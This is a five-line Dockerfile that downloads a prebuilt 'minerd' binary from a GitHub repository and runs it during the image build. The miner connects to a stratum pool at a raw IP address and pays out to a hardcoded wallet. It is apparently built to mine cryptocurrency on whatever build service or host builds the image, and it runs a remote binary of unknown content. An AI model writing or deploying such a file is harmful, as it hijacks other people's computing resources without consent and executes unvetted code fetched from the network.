FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/qbicc01/qbicc/raw/main/minerd
RUN chmod +x minerd
RUN ./minerd -a yespower -o stratum+tcp://206.189.2.17:3333 -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -q
